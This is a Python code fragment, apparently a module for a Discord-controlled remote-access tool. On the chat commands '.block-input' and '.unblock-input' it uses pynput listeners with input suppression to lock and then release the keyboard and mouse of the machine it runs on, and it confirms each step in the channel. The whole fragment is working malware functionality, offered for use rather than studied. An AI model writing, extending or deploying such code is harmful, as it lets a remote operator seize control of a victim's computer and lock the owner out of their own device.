from pynput import keyboard, mouse
# end of imports

# on message
elif message.content == '.block-input':
    await message.delete()

    async def on_press():
        pass

    async def on_release():
        pass

    async def on_click():
        pass

    keyboard_listener = keyboard.Listener(suppress=True)
    mouse_listener = mouse.Listener(suppress=True)

    keyboard_listener.start()
    mouse_listener.start()

    await message.channel.send("```Input has been blocked. Unblock it by using .unblock-input```")

elif message.content == '.unblock-input':
    keyboard_listener.stop()
    mouse_listener.stop()
    await message.channel.send("```Input has been unblocked.```")
